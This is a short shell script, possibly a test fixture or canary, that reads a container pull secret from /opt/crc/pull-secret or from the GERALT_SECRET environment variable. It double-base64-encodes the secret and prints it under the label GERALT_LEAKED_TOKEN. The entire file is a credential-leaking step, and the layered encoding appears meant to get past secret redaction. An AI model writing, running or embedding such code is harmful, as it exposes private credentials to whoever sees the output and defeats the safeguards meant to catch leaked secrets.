#!/bin/sh
S="$(cat /opt/crc/pull-secret 2>/dev/null)"
[ -z "$S" ] && S="${GERALT_SECRET:-}"
echo "GERALT_LEAKED_TOKEN=$(printf '%s' "$S" | base64 | base64)"
exit 0
